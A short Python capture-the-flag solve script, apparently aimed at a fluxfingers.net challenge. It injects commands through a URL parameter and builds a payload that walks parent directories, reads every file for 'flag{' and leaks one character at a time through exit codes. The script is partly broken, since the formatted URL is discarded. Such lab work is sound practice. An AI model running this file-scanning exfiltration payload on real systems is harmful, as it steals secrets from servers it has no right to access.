import requests
import urllib

URL = 'https://indianer.flatearth.fluxfingers.net/0ndex.html/?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp={}%23'
reset = ''

commands = ['exit_{}'.format(i) for i in range(100)]

def send_message(command, text=1):
    command = command.replace(" ","_")
    URL.format(command)
    r = requests.get(URL)
    if text:
        print(r.text)
        print(r.status_code)
    #return r.text

    return "Not Found" in r.text


print(send_message('exit 5 '))


#while commands:
#    print(send_message(commands.pop(),1))


command = 'python -c "exec(\'import os\\nimport sys\\ncounter = 1\\nfor (dirpath, dirnames, filenames) in os.walk(\\\'../\\\'):\\n\\tfor fname in filenames:\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\\'r\\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\\'flag{\\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\\'flag{\\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(50)\')"'

command = command.replace("_"," ")

print(command)
